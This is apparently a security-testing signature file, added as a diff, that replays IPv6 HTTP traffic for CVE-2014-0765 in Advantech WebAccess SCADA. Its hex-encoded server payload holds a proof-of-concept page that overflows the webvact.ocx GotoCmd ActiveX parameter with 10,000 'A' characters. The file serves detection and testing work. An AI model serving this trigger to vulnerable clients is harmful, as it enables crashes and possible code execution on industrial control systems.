@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Advantech WebAccess SCADA webvact.ocx GotoCmd Buffer Overflow(IPv6 Version)"/>
+    <EngDesc display="true" value="A stack buffer overflow exists in Advantech's WebAccess SCADA software. This is due to insufficient input validation on the GotoCmd parameter of the webvact.ocx ActiveX control, a part of the WebAccess Client. A remote, unauthenticated attacker could exploit this vulnerability by enticing a vulnerable user to open a crafted web page. Successful exploitation could lead to code execution in the context of the target user."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS,IPV6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Moderate"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Advantech"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="WebAccess"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_7.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140415-01"/>
+    <CVEID display="true" value="CVE-2014-0765"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="105564"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="2116d379b172befbecb5dfb68913ee30"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635368888504295229"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1401269435" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:07:A9" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="50856" destPort="$HTTPdestPort" SeqNumber="2A125EC8" AckNumber="551A8BE5" HeaderLength="05" WindowSize="0100" Checksum="481C" UrgentPointer="0000" Options="" Payload="474554202F7E6D6C696E2F706F632E68746D6C20485454502F312E310D0A4163636570743A20746578742F68746D6C2C206170706C69636174696F6E2F7868746D6C2B786D6C2C202A2F2A0D0A526566657265723A20687474703A2F2F3137322E31362E312E322F7E6D6C696E2F0D0A4163636570742D4C616E67756167653A20656E2D55530D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420362E313B2054726964656E742F372E303B2072763A31312E3029206C696B65204765636B6F0D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A486F73743A203137322E31362E312E320D0A444E543A20310D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:07:A9" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <TCP srcPort="$HTTPdestPort" destPort="50856" SeqNumber="551A8BE5" AckNumber="2A125FEF" HeaderLength="05" WindowSize="0036" Checksum="6921" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204672692C203032204D617920323031342032313A34323A313620474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E34205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A204672692C203032204D617920323031342032303A35363A323420474D540D0A455461673A2022316134383662652D66652D34663837313033623438653030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203235340D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0A2020203C626F64793E0A2020202020203C68323E54454C5553205365637572697479204C6162732C2050726F6F66206F6620436F6E636570743C2F68323E0A2020202020203C6F626A6563742069643D276374726C2720636C61737369643D27636C7369643A33413234463937462D323546372D344136422D423146462D323133333939413131443542273E3C2F6F626A6563743E0A2020202020203C7363726970743E0A2020202020202020206374726C2E476F746F436D64203D204172726179283130303030292E6A6F696E28224122290A2020202020203C2F7363726970743E0A2020203C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
